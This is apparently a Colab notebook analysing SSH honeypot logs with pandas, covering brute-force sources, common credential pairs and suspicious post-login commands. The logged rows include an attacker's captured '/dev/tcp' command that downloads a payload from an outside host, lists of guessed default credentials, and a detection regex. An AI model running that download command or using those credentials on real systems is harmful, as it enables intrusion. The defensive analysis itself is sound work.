In [3]:
from google.colab import files

uploaded = files.upload()

Saving ssh_attacks_full.csv to ssh_attacks_full.csv


In [4]:
# Initial Dataset Loading:

import pandas as pd

df = pd.read_csv("ssh_attacks_full.csv",low_memory=False)

print(df.shape)
print(df.columns)
df.head()

(145425, 9)
Index(['id', 'timestamp', 'session_id', 'ip', 'port', 'event_type', 'message', 'command', 'level'], dtype='object')


,id,timestamp,session_id,ip,port,event_type,message,command,level
0,75,2025-07-27T07:16:44.579977,68340b18-6929-44e0-901d-17e4a9c2da91,79.142.197.170,29869,SSH connect,"New connection: 79.142.197.170:29869, client - <socket.socket fd=8, family=2...",NaN,INFO
1,76,2025-07-27T07:17:26.016014,b31c9c8d-96cd-4429-afe0-36cafbe2d29b,79.142.197.170,30352,SSH connect,"New connection: 79.142.197.170:30352, client - <socket.socket fd=8, family=2...",NaN,INFO
2,77,2025-07-27T07:17:28.136505,b31c9c8d-96cd-4429-afe0-36cafbe2d29b,79.142.197.170,30352,SSH login,"Bot entered username: root, password: test",NaN,WARNING
3,78,2025-07-27T07:17:33.299048,b31c9c8d-96cd-4429-afe0-36cafbe2d29b,79.142.197.170,30352,exec_command,Entered command - exit\r\n,exit\r\n,WARNING
4,79,2025-07-27T07:17:33.302821,b31c9c8d-96cd-4429-afe0-36cafbe2d29b,79.142.197.170,30352,SSH disconnect,Bot disconnected,exit\r\n,WARNING


In [5]:
# Initial Event Analysis:

df["event_type"].value_counts()

,count
event_type,
SSH connect,137506
SSH login,4797
SSH disconnect,3094
exec_command,28


In [6]:
# Initial Event Analysis in Percentages:

df["event_type"].value_counts(normalize=True) * 100

,proportion
event_type,
SSH connect,94.554581
SSH login,3.298608
SSH disconnect,2.127557
exec_command,0.019254


In [7]:
# Threat Hunting Investigation

pd.set_option('display.max_columns', None)
pd.set_option('display.max_colwidth', 50)

threat_hunting = df[df["event_type"] == "exec_command"][
    ["timestamp", "session_id", "ip", "message", "command", "level"]
]

display(threat_hunting)

,timestamp,session_id,ip,message,command,level
3,2025-07-27T07:17:33.299048,b31c9c8d-96cd-4429-afe0-36cafbe2d29b,79.142.197.170,Entered command - exit\r\n,exit\r\n,WARNING
15,2025-07-27T07:24:31.307723,2855ddd5-74ca-4c76-a889-69a858802f5b,79.142.197.170,Entered command - exit\r\n,exit\r\n,WARNING
19,2025-07-27T07:24:44.526569,efe50459-19f9-4998-bf56-ca4e9e9be258,79.142.197.170,Entered command - exit\r\n,exit\r\n,WARNING
42,2025-07-27T07:49:49.443443,da00b02a-5566-4604-9aed-e74dc08605eb,104.28.220.247,Entered command - учше\r\n,учше\r\n,WARNING
43,2025-07-27T07:49:53.671944,da00b02a-5566-4604-9aed-e74dc08605eb,104.28.220.247,Entered command - exit\r\n,exit\r\n,WARNING
1095,2025-07-30T11:22:51.299514,ac19ef5e-2a11-469c-a541-179dca92454c,104.28.220.248,Entered command - exit\r\n,exit\r\n,WARNING
1099,2025-07-30T11:41:56.336481,b78b92fc-f351-49d8-9325-7f4f5bdddb40,104.28.252.248,Entered command - cd /tmp\r\n,cd /tmp\r\n,WARNING
1100,2025-07-30T11:42:11.227590,b78b92fc-f351-49d8-9325-7f4f5bdddb40,104.28.252.248,Entered command - cd ..\r\n,cd ..\r\n,WARNING
1101,2025-07-30T11:42:14.615983,b78b92fc-f351-49d8-9325-7f4f5bdddb40,104.28.252.248,Entered command - cd /var\r\n,cd /var\r\n,WARNING
1102,2025-07-30T11:42:15.646820,b78b92fc-f351-49d8-9325-7f4f5bdddb40,104.28.252.248,Entered command - ls\r\n,ls\r\n,WARNING


In [8]:
# Finding 01: Suspicious Post-Login Activity
suspicious_session = "9caa7e8b-7378-41b7-9bdd-4ae800e2466e"

df[df["session_id"] == suspicious_session][
    ["timestamp", "ip", "event_type", "message", "command", "level"]
]

,timestamp,ip,event_type,message,command,level
72652,2025-09-07T08:39:05.484958,47.251.118.172,SSH connect,"New connection: 47.251.118.172:50278, client -...",NaN,INFO
72653,2025-09-07T08:39:06.248271,47.251.118.172,SSH login,"Bot entered username: root, password: 123456",NaN,WARNING
72654,2025-09-07T08:39:07.020032,47.251.118.172,exec_command,"Entered command - nohup bash -c ""exec 6<>/dev/...","nohup bash -c ""exec 6<>/dev/tcp/8.210.252.89/6...",WARNING
72655,2025-09-07T08:39:07.123850,47.251.118.172,exec_command,Entered command - dd bs=1 count=1911588 > /tmp...,dd bs=1 count=1911588 > /tmp/djJJJF5kbk\n,WARNING


In [9]:
# Finding 02: High-Volume and Rapid SSH Connection Activity

# Count SSH connection and login events by source IP
ip_activity = df[
    df["event_type"].isin(["SSH connect", "SSH login"])
]["ip"].value_counts().head(5)

print("Top Source IPs by SSH Activity:")
display(ip_activity.to_frame("event_count"))

# Investigate the IP with the highest activity
top_ip = ip_activity.index[0]

top_ip_logs = df[
    df["ip"] == top_ip
][["timestamp", "ip", "event_type", "message"]].head(10)

print(f"Activity from Top Source IP: {top_ip}")
display(top_ip_logs)

Top Source IPs by SSH Activity:


,event_count
ip,
87.120.191.13,4461
185.156.73.233,2096
148.72.158.192,1870
196.251.85.101,1763
143.110.248.222,1635


Activity from Top Source IP: 87.120.191.13


,timestamp,ip,event_type,message
44001,2025-08-25T14:24:00.711163,87.120.191.13,SSH connect,"New connection: 87.120.191.13:33758, client - ..."
44002,2025-08-25T14:24:00.713442,87.120.191.13,SSH connect,"New connection: 87.120.191.13:33802, client - ..."
44003,2025-08-25T14:24:00.716320,87.120.191.13,SSH connect,"New connection: 87.120.191.13:33830, client - ..."
44004,2025-08-25T14:24:00.717560,87.120.191.13,SSH connect,"New connection: 87.120.191.13:33786, client - ..."
44005,2025-08-25T14:24:00.719193,87.120.191.13,SSH connect,"New connection: 87.120.191.13:33828, client - ..."
44006,2025-08-25T14:24:00.721786,87.120.191.13,SSH connect,"New connection: 87.120.191.13:33774, client - ..."
44007,2025-08-25T14:24:00.723157,87.120.191.13,SSH connect,"New connection: 87.120.191.13:33814, client - ..."
44008,2025-08-25T14:24:00.749887,87.120.191.13,SSH connect,"New connection: 87.120.191.13:33842, client - ..."
44009,2025-08-25T14:24:00.796173,87.120.191.13,SSH connect,"New connection: 87.120.191.13:33848, client - ..."
44010,2025-08-25T14:24:00.798607,87.120.191.13,SSH connect,"New connection: 87.120.191.13:33862, client - ..."


In [10]:
# Finding 03: Repeated Credential Attempts from Multiple Source IPs

pd.set_option('display.max_colwidth', None)

# Part 1: Identify the most frequently attempted credentials
login_events = df[df["event_type"] == "SSH login"].copy()

login_events["credentials"] = login_events["message"].str.extract(
    r'(username: .*, password: .*)'
)

top_creds = login_events["credentials"].value_counts().head(10).reset_index()
top_creds.columns = ["Attempted Credentials (User & Password)", "Total Attempt Count"]

display(top_creds)


# Part 2: Verify the most frequently attempted credentials across multiple IPs
credential = "345gs5662d34"

credential_logs = login_events[
    login_events["message"].str.contains(credential, na=False)
][["timestamp", "ip", "message", "level"]]

display(credential_logs.head(20))

,Attempted Credentials (User & Password),Total Attempt Count
0,"username: 345gs5662d34, password: 345gs5662d34",560
1,"username: root, password: 3245gs5662d34",383
2,"username: root, password: root",33
3,"username: , password:",28
4,"username: array, password: admin",20
5,"username: root, password:",17
6,"username: root, password: ------fuck------",17
7,"username: root, password: FattMan1234567890",15
8,"username: ubuntu, password: ubuntu",14
9,"username: user, password: user",14


,timestamp,ip,message,level
9,2025-07-27T07:18:37.518854,85.208.253.189,"Bot entered username: 345gs5662d34, password: 345gs5662d34",WARNING
68,2025-07-27T08:18:06.456791,47.74.45.204,"Bot entered username: 345gs5662d34, password: 345gs5662d34",WARNING
1122,2025-07-30T12:06:36.443296,51.161.8.48,"Bot entered username: 345gs5662d34, password: 345gs5662d34",WARNING
1129,2025-07-30T12:07:47.227542,103.189.235.247,"Bot entered username: 345gs5662d34, password: 345gs5662d34",WARNING
1139,2025-07-30T12:10:27.466393,52.224.240.74,"Bot entered username: 345gs5662d34, password: 345gs5662d34",WARNING
1149,2025-07-30T12:17:32.507508,38.22.160.113,"Bot entered username: 345gs5662d34, password: 345gs5662d34",WARNING
1157,2025-07-30T12:20:45.174725,14.253.149.9,"Bot entered username: 345gs5662d34, password: 345gs5662d34",WARNING
1164,2025-07-30T12:26:54.952153,77.68.100.69,"Bot entered username: 345gs5662d34, password: 345gs5662d34",WARNING
1171,2025-07-30T12:28:14.804355,24.144.83.187,"Bot entered username: 345gs5662d34, password: 345gs5662d34",WARNING
1194,2025-07-30T13:20:58.518247,165.227.72.212,"Bot entered username: 345gs5662d34, password: 345gs5662d34",WARNING


In [11]:
# Finding 04: Off-Peak Automated SSH Credential-Guessing Activity

import pandas as pd

pd.set_option('display.max_colwidth', None)

# Convert timestamp to datetime and extract hour
df['datetime'] = pd.to_datetime(df['timestamp'])
df['hour'] = df['datetime'].dt.hour

# Select SSH connection/login events during off-peak hours (00:00–06:00)
off_peak_ssh = df[
    (df['hour'] >= 0) &
    (df['hour'] <= 6) &
    (df['event_type'].isin(['SSH connect', 'SSH login']))
].copy()

# Count off-peak SSH activity and WARNING-level login events per IP
ip_activity = (
    off_peak_ssh.groupby('ip')
    .size()
    .rename('off_peak_events')
)

warning_logins = off_peak_ssh[
    (off_peak_ssh['event_type'] == 'SSH login') &
    (off_peak_ssh['level'] == 'WARNING')
].copy()

warning_activity = (
    warning_logins.groupby('ip')
    .size()
    .rename('warning_login_events')
)

# Identify IPs with WARNING-level SSH login activity
finding4_summary = pd.concat(
    [ip_activity, warning_activity],
    axis=1
).fillna(0)

finding4_summary = (
    finding4_summary[
        finding4_summary['warning_login_events'] > 0
    ]
    .sort_values(
        ['warning_login_events', 'off_peak_events'],
        ascending=False
    )
    .reset_index()
)

print("=== FINDING #4: OFF-PEAK AUTOMATED SSH CREDENTIAL-GUESSING ACTIVITY ===")
display(finding4_summary.head(10))

# Investigate the strongest source IP
top_ip = finding4_summary.iloc[0]['ip']

top_ip_logs = (
    off_peak_ssh[
        off_peak_ssh['ip'] == top_ip
    ][['timestamp', 'ip', 'event_type', 'level', 'message']]
    .sort_values('timestamp')
    .reset_index(drop=True)
)

print(f"\n=== Detailed Activity for Top IP: {top_ip} ===")
display(top_ip_logs.head(20))

# Show event type and severity distribution
event_distribution = (
    off_peak_ssh[
        off_peak_ssh['ip'] == top_ip
    ]
    .groupby(['event_type', 'level'])
    .size()
    .reset_index(name='event_count')
)

print("\n=== Event Type and Severity Distribution ===")
display(event_distribution)

# Show WARNING/Bot activity
bot_evidence = top_ip_logs[
    (top_ip_logs['level'] == 'WARNING') |
    (top_ip_logs['message'].str.contains('bot', case=False, na=False))
]

print("\n=== WARNING / Bot Activity Evidence ===")
display(bot_evidence.head(20))

=== FINDING #4: OFF-PEAK AUTOMATED SSH CREDENTIAL-GUESSING ACTIVITY ===


,ip,off_peak_events,warning_login_events
0,47.250.117.156,493,245.0
1,176.65.148.27,108,26.0
2,14.103.118.177,68,22.0
3,187.157.91.186,102,18.0
4,80.94.95.112,67,18.0
5,80.94.95.15,40,18.0
6,77.90.50.225,37,18.0
7,195.178.110.211,17,8.0
8,195.211.188.200,17,8.0
9,195.178.110.160,119,7.0



=== Detailed Activity for Top IP: 47.250.117.156 ===


,timestamp,ip,event_type,level,message
0,2025-09-07T05:17:09.186743,47.250.117.156,SSH connect,INFO,"New connection: 47.250.117.156:50252, client - <socket.socket fd=8, family=2, type=1, proto=0, laddr=('209.38.249.252', 2222), raddr=('47.250.117.156', 50252)>"
1,2025-09-07T05:17:43.193769,47.250.117.156,SSH connect,INFO,"New connection: 47.250.117.156:47292, client - <socket.socket fd=10, family=2, type=1, proto=0, laddr=('209.38.249.252', 2222), raddr=('47.250.117.156', 47292)>"
2,2025-09-07T05:17:44.188762,47.250.117.156,SSH login,WARNING,"Bot entered username: root, password: !Q2w3e4r"
3,2025-09-07T05:17:55.168548,47.250.117.156,SSH connect,INFO,"New connection: 47.250.117.156:41696, client - <socket.socket fd=8, family=2, type=1, proto=0, laddr=('209.38.249.252', 2222), raddr=('47.250.117.156', 41696)>"
4,2025-09-07T05:17:56.195832,47.250.117.156,SSH login,WARNING,"Bot entered username: pi, password: raspberry"
5,2025-09-07T05:18:07.615566,47.250.117.156,SSH connect,INFO,"New connection: 47.250.117.156:36092, client - <socket.socket fd=10, family=2, type=1, proto=0, laddr=('209.38.249.252', 2222), raddr=('47.250.117.156', 36092)>"
6,2025-09-07T05:18:08.636730,47.250.117.156,SSH login,WARNING,"Bot entered username: hive, password: hive"
7,2025-09-07T05:18:19.259104,47.250.117.156,SSH connect,INFO,"New connection: 47.250.117.156:58720, client - <socket.socket fd=8, family=2, type=1, proto=0, laddr=('209.38.249.252', 2222), raddr=('47.250.117.156', 58720)>"
8,2025-09-07T05:18:20.420158,47.250.117.156,SSH login,WARNING,"Bot entered username: git, password: git"
9,2025-09-07T05:18:31.677904,47.250.117.156,SSH connect,INFO,"New connection: 47.250.117.156:53112, client - <socket.socket fd=10, family=2, type=1, proto=0, laddr=('209.38.249.252', 2222), raddr=('47.250.117.156', 53112)>"



=== Event Type and Severity Distribution ===


,event_type,level,event_count
0,SSH connect,INFO,248
1,SSH login,WARNING,245



=== WARNING / Bot Activity Evidence ===


,timestamp,ip,event_type,level,message
2,2025-09-07T05:17:44.188762,47.250.117.156,SSH login,WARNING,"Bot entered username: root, password: !Q2w3e4r"
4,2025-09-07T05:17:56.195832,47.250.117.156,SSH login,WARNING,"Bot entered username: pi, password: raspberry"
6,2025-09-07T05:18:08.636730,47.250.117.156,SSH login,WARNING,"Bot entered username: hive, password: hive"
8,2025-09-07T05:18:20.420158,47.250.117.156,SSH login,WARNING,"Bot entered username: git, password: git"
10,2025-09-07T05:18:32.727608,47.250.117.156,SSH login,WARNING,"Bot entered username: wang, password: wang123"
12,2025-09-07T05:18:47.325053,47.250.117.156,SSH login,WARNING,"Bot entered username: nginx, password: nginx"
14,2025-09-07T05:18:58.935231,47.250.117.156,SSH login,WARNING,"Bot entered username: mongo, password: 123456"
16,2025-09-07T05:19:11.995017,47.250.117.156,SSH login,WARNING,"Bot entered username: user, password: 111111"
18,2025-09-07T05:19:23.388082,47.250.117.156,SSH login,WARNING,"Bot entered username: oracle, password: oracle"
20,2025-09-07T05:19:34.789124,47.250.117.156,SSH login,WARNING,"Bot entered username: gpadmin, password: gpadmin123"


In [12]:
# AUTOMATED THREAT HUNTING

import pandas as pd

pd.set_option('display.max_columns', None)
pd.set_option('display.max_colwidth', 80)
pd.set_option('display.width', 200)
# Convert timestamp for time-based analysis
df['datetime'] = pd.to_datetime(df['timestamp'], errors='coerce')

# FINDING 1: Suspicious Post-Login Activity
# Suspicious command indicators observed during investigation
suspicious_patterns = r'/dev/tcp|nohup|/tmp|dd\s'
finding1 = df[
    (df['event_type'] == 'exec_command') &
    (
        df['command'].fillna('').str.contains(
            suspicious_patterns,
            case=False,
            regex=True
        )
        |
        df['message'].fillna('').str.contains(
            suspicious_patterns,
            case=False,
            regex=True
        )
    )
].copy()
print("=== FINDING 1: SUSPICIOUS POST-LOGIN ACTIVITY ===")
display(
    finding1[
        ['timestamp', 'session_id', 'ip',
         'event_type', 'message', 'command', 'level']
    ].sort_values('timestamp')
)

# FINDING 2: High-Volume and Rapid SSH Activity
ssh_events = df[
    df['event_type'].isin(['SSH connect', 'SSH login'])
].copy()
# Count SSH connection/login events per source IP
finding2_summary = (
    ssh_events.groupby('ip')
    .size()
    .reset_index(name='event_count')
)
# First and last observed activity
time_summary = (
    ssh_events.groupby('ip')['datetime']
    .agg(['min', 'max'])
    .reset_index()
    .rename(columns={
        'min': 'first_seen',
        'max': 'last_seen'
    })
)
finding2_summary = finding2_summary.merge(
    time_summary,
    on='ip'
)

# Automatically flag high-volume sources
finding2_summary = (
    finding2_summary[
        finding2_summary['event_count'] >= 100
    ]
    .sort_values('event_count', ascending=False)
    .head(10)
    .reset_index(drop=True)
)
print("\n=== FINDING 2: HIGH-VOLUME AND RAPID SSH ACTIVITY ===")
display(finding2_summary)
# Show detailed events for the highest-volume IP
if not finding2_summary.empty:
    top_ip = finding2_summary.iloc[0]['ip']
    finding2_details = ssh_events[
        ssh_events['ip'] == top_ip
    ][
        ['timestamp', 'ip', 'event_type', 'message']
    ].sort_values('timestamp').head(20)
    print(f"\n=== Detailed Activity for Top IP: {top_ip} ===")
    display(finding2_details)

# FINDING 3: Repeated Credential Attempts
login_events = df[
    df['event_type'] == 'SSH login'
].copy()
# Extract username/password combination
login_events['credentials'] = login_events['message'].str.extract(
    r'(username:\s*.*?,\s*password:\s*.*)'
)[0]
# Count repeated credentials
credential_counts = (
    login_events.groupby('credentials')
    .size()
    .reset_index(name='attempt_count')
)
# Count different source IPs for each credential pair
credential_ip_counts = (
    login_events.groupby('credentials')['ip']
    .nunique()
    .reset_index(name='source_ip_count')
)
finding3_summary = credential_counts.merge(
    credential_ip_counts,
    on='credentials'
)
# Automatically flag credentials repeatedly attempted
# from multiple source IPs
finding3_summary = (
    finding3_summary[
        (finding3_summary['attempt_count'] >= 20) &
        (finding3_summary['source_ip_count'] >= 2)
    ]
    .sort_values(
        ['attempt_count', 'source_ip_count'],
        ascending=False
    )
    .head(10)
    .reset_index(drop=True)
)
print("\n=== FINDING 3: REPEATED CREDENTIAL ATTEMPTS ===")
display(finding3_summary)
# Show detailed events for the most frequently attempted credential
if not finding3_summary.empty:
    top_credential = finding3_summary.iloc[0]['credentials']
    finding3_details = login_events[
        login_events['credentials'] == top_credential
    ][
        ['timestamp', 'ip', 'message', 'level']
    ].head(20)
    print("\n=== Detailed Attempts for Top Credential Pair ===")
    display(finding3_details)

# FINDING 4: Off-Peak Automated SSH Credential-Guessing
# Select SSH activity between 00:00 and 06:00
off_peak_ssh = df[
    (df['datetime'].dt.hour >= 0) &
    (df['datetime'].dt.hour <= 6) &
    (df['event_type'].isin(['SSH connect', 'SSH login']))
].copy()
# Total off-peak SSH activity per IP
off_peak_counts = (
    off_peak_ssh.groupby('ip')
    .size()
    .reset_index(name='off_peak_events')
)
# WARNING-level SSH login activity
warning_logins = off_peak_ssh[
    (off_peak_ssh['event_type'] == 'SSH login') &
    (off_peak_ssh['level'] == 'WARNING')
].copy()
warning_counts = (
    warning_logins.groupby('ip')
    .size()
    .reset_index(name='warning_login_events')
)
finding4_summary = off_peak_counts.merge(
    warning_counts,
    on='ip',
    how='left'
)
finding4_summary['warning_login_events'] = (
    finding4_summary['warning_login_events']
    .fillna(0)
)
# Automatically flag IPs with repeated off-peak
# WARNING-level login activity
finding4_summary = (
    finding4_summary[
        (finding4_summary['warning_login_events'] > 0) &
        (finding4_summary['off_peak_events'] >= 10)
    ]
    .sort_values(
        ['warning_login_events', 'off_peak_events'],
        ascending=False
    )
    .head(10)
    .reset_index(drop=True)
)
print(
    "\n=== FINDING 4: OFF-PEAK AUTOMATED "
    "SSH CREDENTIAL-GUESSING ACTIVITY ==="
)
display(finding4_summary)
# Show detailed WARNING/Bot evidence for the strongest IP
if not finding4_summary.empty:
    top_off_peak_ip = finding4_summary.iloc[0]['ip']
    finding4_details = off_peak_ssh[
        off_peak_ssh['ip'] == top_off_peak_ip
    ][
        ['timestamp', 'ip', 'event_type', 'level', 'message']
    ].sort_values('timestamp')
    finding4_details = finding4_details[
        (finding4_details['level'] == 'WARNING') |
        (finding4_details['message'].str.contains(
            'bot',
            case=False,
            na=False
        ))
    ].head(20)
    print(
        f"\n=== WARNING / BOT ACTIVITY: "
        f"{top_off_peak_ip} ==="
    )
    display(finding4_details)

# AUTOMATION SUMMARY
print("\n" + "=" * 70)
print("AUTOMATED THREAT HUNTING SUMMARY")
print("=" * 70)
print(
    f"Finding 1 - Suspicious Post-Login Activity: "
    f"{len(finding1)} events flagged"
)
print(
    f"Finding 2 - High-Volume and Rapid SSH Activity: "
    f"{len(finding2_summary)} IPs flagged"
)
print(
    f"Finding 3 - Repeated Credential Attempts: "
    f"{len(finding3_summary)} credential patterns flagged"
)
print(
    f"Finding 4 - Off-Peak Automated SSH Activity: "
    f"{len(finding4_summary)} IPs flagged"
)

=== FINDING 1: SUSPICIOUS POST-LOGIN ACTIVITY ===


,timestamp,session_id,ip,event_type,message,command,level
1099,2025-07-30T11:41:56.336481,b78b92fc-f351-49d8-9325-7f4f5bdddb40,104.28.252.248,exec_command,Entered command - cd /tmp\r\n,cd /tmp\r\n,WARNING
72654,2025-09-07T08:39:07.020032,9caa7e8b-7378-41b7-9bdd-4ae800e2466e,47.251.118.172,exec_command,"Entered command - nohup bash -c ""exec 6<>/dev/tcp/8.210.252.89/60147 && echo...","nohup bash -c ""exec 6<>/dev/tcp/8.210.252.89/60147 && echo -n 'GET /linux' >...",WARNING
72655,2025-09-07T08:39:07.123850,9caa7e8b-7378-41b7-9bdd-4ae800e2466e,47.251.118.172,exec_command,Entered command - dd bs=1 count=1911588 > /tmp/djJJJF5kbk\n,dd bs=1 count=1911588 > /tmp/djJJJF5kbk\n,WARNING



=== FINDING 2: HIGH-VOLUME AND RAPID SSH ACTIVITY ===


,ip,event_count,first_seen,last_seen
0,87.120.191.13,4461,2025-08-25 14:24:00.711163,2025-09-16 13:18:28.699417
1,185.156.73.233,2096,2025-08-01 03:44:23.786974,2025-11-04 21:17:18.528461
2,148.72.158.192,1870,2025-08-29 18:22:49.609929,2025-09-05 21:18:34.754077
3,196.251.85.101,1763,2025-07-27 20:28:09.620157,2025-09-07 11:50:41.717397
4,143.110.248.222,1635,2025-08-28 12:40:05.814892,2025-08-28 14:24:02.314584
5,134.209.158.3,1574,2025-10-23 08:29:28.626143,2025-11-02 21:07:12.777605
6,165.22.16.79,1074,2025-08-03 04:36:04.073133,2025-08-28 06:08:26.914552
7,57.129.44.21,911,2025-08-03 18:41:46.022765,2025-08-04 03:43:14.271208
8,170.64.203.74,899,2025-09-12 14:25:42.905209,2025-09-12 16:55:22.380860
9,157.230.249.150,883,2025-10-25 22:39:27.428567,2025-11-05 10:16:26.787791



=== Detailed Activity for Top IP: 87.120.191.13 ===


...


=== FINDING 4: OFF-PEAK AUTOMATED SSH CREDENTIAL-GUESSING ACTIVITY ===


,ip,off_peak_events,warning_login_events
0,47.250.117.156,493,245.0
1,176.65.148.27,108,26.0
2,14.103.118.177,68,22.0
3,187.157.91.186,102,18.0
4,80.94.95.112,67,18.0
5,80.94.95.15,40,18.0
6,77.90.50.225,37,18.0
7,195.178.110.211,17,8.0
8,195.211.188.200,17,8.0
9,195.178.110.160,119,7.0



=== WARNING / BOT ACTIVITY: 47.250.117.156 ===


,timestamp,ip,event_type,level,message
71655,2025-09-07T05:17:44.188762,47.250.117.156,SSH login,WARNING,"Bot entered username: root, password: !Q2w3e4r"
71658,2025-09-07T05:17:56.195832,47.250.117.156,SSH login,WARNING,"Bot entered username: pi, password: raspberry"
71661,2025-09-07T05:18:08.636730,47.250.117.156,SSH login,WARNING,"Bot entered username: hive, password: hive"
71664,2025-09-07T05:18:20.420158,47.250.117.156,SSH login,WARNING,"Bot entered username: git, password: git"
71667,2025-09-07T05:18:32.727608,47.250.117.156,SSH login,WARNING,"Bot entered username: wang, password: wang123"
71670,2025-09-07T05:18:47.325053,47.250.117.156,SSH login,WARNING,"Bot entered username: nginx, password: nginx"
71673,2025-09-07T05:18:58.935231,47.250.117.156,SSH login,WARNING,"Bot entered username: mongo, password: 123456"
71676,2025-09-07T05:19:11.995017,47.250.117.156,SSH login,WARNING,"Bot entered username: user, password: 111111"
71679,2025-09-07T05:19:23.388082,47.250.117.156,SSH login,WARNING,"Bot entered username: oracle, password: oracle"
71684,2025-09-07T05:19:34.789124,47.250.117.156,SSH login,WARNING,"Bot entered username: gpadmin, password: gpadmin123"



AUTOMATED THREAT HUNTING SUMMARY
Finding 1 - Suspicious Post-Login Activity: 3 events flagged
Finding 2 - High-Volume and Rapid SSH Activity: 10 IPs flagged
Finding 3 - Repeated Credential Attempts: 4 credential patterns flagged
Finding 4 - Off-Peak Automated SSH Activity: 10 IPs flagged
